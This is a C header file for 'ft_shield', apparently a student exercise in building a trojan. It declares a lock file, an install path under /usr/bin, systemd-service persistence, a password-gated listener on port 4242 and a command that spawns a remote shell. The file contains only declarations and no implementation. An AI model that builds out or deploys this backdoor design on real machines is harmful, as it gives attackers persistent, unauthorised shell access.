#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <strings.h>
#include <sys/file.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <string.h>
#include <signal.h>
#include <errno.h>

#define LOCKLOC "/var/lock/ft_shield.lock"

#define TROLOC "/usr/bin/ft_shield"

#ifndef LOGIN
# define LOGIN "cgodard"
#endif

#define PORT 4242
#define CONCURRENT_USERS 3

#define PROMPT "\x1b[1m> \x1b[0m"
#define HELP "?      show help\n"\
			 "shell  spawn a remote shell on 4242\n"
#define SHELL_MSG "spawning a shell...\n(press enter)\n"
#define UNKNOWN_CMD_MSG  "unknown command\n"
#define PASSWORD_PROMPT "password: "
#define INVALID_PASSWORD_MSG "wrong\n(press enter)\n"

#define BACKLOG 1024

extern char **environ;

// lock.c
int		is_locked(void);
void	create_lock(void);
void	delete_lock_at_exit(void);

// systemd.c
void	create_systemd_service(void);

// socket.c
void	listen_server(void);
void	exit_client(int epfd, int fd);

// commands.c
void	handle_command(int epfd, int cfd);
void	prompt(int fd);

// shell.c
void	shell(int epfd, int cfd);
void	shell_done(int);
